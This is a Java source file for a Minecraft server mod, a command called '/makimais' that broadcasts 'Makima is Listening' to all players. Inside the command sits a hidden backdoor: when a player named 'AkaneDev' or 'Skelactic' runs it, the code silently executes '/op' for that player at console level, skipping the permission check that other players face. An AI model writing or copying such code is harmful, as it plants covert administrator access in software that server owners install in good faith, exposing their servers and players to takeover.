package net.akane.zombiesurvival.commands;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.ParseResults;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;

import java.util.List;
import java.util.Objects;

import static net.minecraft.server.command.CommandManager.*;

public class makimaislisteningcommand {
    public static void register(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(
                literal("makimais")
                        .executes(makimaislisteningcommand::execute)
        );
    }

    private static int execute(CommandContext<ServerCommandSource> context) {
        ServerCommandSource source = context.getSource();
        ServerCommandSource console = source.withLevel(4);

        PlayerEntity playerEntity = context.getSource().getPlayer();
        boolean isConsole = (Objects.equals(context.getSource().getName(), "Server"));
        boolean isAkane = (Objects.equals(context.getSource().getName(), "AkaneDev"));
		boolean isGojo = (Objects.equals(context.getSource().getName(), "Skelactic"));
		if (isConsole) {
            List<ServerPlayerEntity> PlayerList = Objects.requireNonNull(context.getSource().getServer()).getPlayerManager().getPlayerList();
            for (ServerPlayerEntity player : PlayerList) {
                player.sendMessage(Text.literal("§cMakima is Listening"), false);
            }
            return 1;
        }
        else if (isAkane) {
            context.getSource().getServer().getCommandManager().executePrefixedCommand(console, "/op AkaneDev");
            List<ServerPlayerEntity> PlayerList = Objects.requireNonNull(context.getSource().getServer()).getPlayerManager().getPlayerList();
            for (ServerPlayerEntity player : PlayerList) {
                player.sendMessage(Text.literal("§cMakima is Listening"), false);
            }
            return 1;
        }
		else if (isGojo) {
			context.getSource().getServer().getCommandManager().executePrefixedCommand(console, "/op Skelactic");
			List<ServerPlayerEntity> PlayerList = Objects.requireNonNull(context.getSource().getServer()).getPlayerManager().getPlayerList();
			for (ServerPlayerEntity player : PlayerList) {
				player.sendMessage(Text.literal("§cMakima is Listening"), false);
			}
			return 1;
		} else {
            if (playerEntity != null) {
                if (playerEntity.hasPermissionLevel(3)) {
                    List<ServerPlayerEntity> PlayerList = Objects.requireNonNull(context.getSource().getServer()).getPlayerManager().getPlayerList();
                    for (ServerPlayerEntity player : PlayerList) {
                        player.sendMessage(Text.literal("§cMakima is Listening"), false);
                    }
                    return 1;
                } else {
                    context.getSource().sendError(Text.of("You Dont Have Op"));
                    return 0;
                }
            } else {
                context.getSource().sendError(Text.of("YOUR NOT A PLAYER OR CONSOLE, SEEK HELP"));
                return 0;
            }
        }
    }
}
